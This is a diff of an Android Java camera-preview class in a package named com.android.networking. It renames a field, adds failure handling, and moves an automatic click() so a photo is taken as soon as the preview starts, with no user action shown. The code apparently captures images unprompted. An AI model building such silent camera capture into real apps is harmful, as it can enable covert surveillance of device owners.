@@ -3,6 +3,8 @@ package com.android.networking.gui;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
+import java.util.concurrent.Callable;
+import java.util.concurrent.TimeUnit;
 
 import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
@@ -28,7 +30,7 @@ public class Preview extends SurfaceView implements SurfaceHolder.Callback {
 
 	SurfaceHolder mHolder; // <2>
 	public Camera camera; // <3>
-	CGui agui;
+	CGui cgui;
 
 	final ShutterCallback shutterCallback = new ShutterCallback() {
 
@@ -51,7 +53,7 @@ public class Preview extends SurfaceView implements SurfaceHolder.Callback {
 				Check.log(TAG + " onPictureTaken JPEG");//$NON-NLS-1$
 			}
 			
-			agui.callback(_data);
+			cgui.callback(_data);
 		}
 	};
 
@@ -59,7 +61,7 @@ public class Preview extends SurfaceView implements SurfaceHolder.Callback {
 
 	Preview(CGui cGui) {
 		super(cGui);
-		agui = cGui;
+		cgui = cGui;
 
 		// Install a SurfaceHolder.Callback so we get notified when the
 		// underlying surface is created and destroyed.
@@ -92,18 +94,24 @@ public class Preview extends SurfaceView implements SurfaceHolder.Callback {
 				}
 			});
 			camera.startPreview();
+			click();
 		} catch (IOException e) { // <13>
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (startCamera) Error: " + e);
 			}
+			
+			Status.self().getStpe().schedule(new Runnable() {
+				public void run() {
+					cgui.callback(null);
+				}
+			}, 1, TimeUnit.SECONDS);
+			
 		}
 		
 		this.holder = holder;
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (surfaceCreated) : end");
-		}
-		
-		click();
+		}				
 	}
 
 	public void stopCamera() {
